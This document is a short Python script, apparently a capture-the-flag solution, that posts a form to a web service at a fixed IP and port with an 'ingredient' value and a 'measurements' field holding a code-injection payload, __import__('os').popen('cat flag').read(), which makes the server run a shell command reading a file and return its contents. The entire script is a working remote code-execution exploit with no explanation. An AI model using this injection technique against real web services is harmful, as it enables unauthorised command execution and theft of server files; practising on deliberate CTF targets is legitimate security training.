#!/usr/bin/python3


import requests

data = {'ingredient': 'dials', 'measurements': '__import__(\'os\').popen(\'cat flag\').read();'}

address = 'http://139.59.166.5:30105/'
r = requests.post(address, data=data)

print(r.content)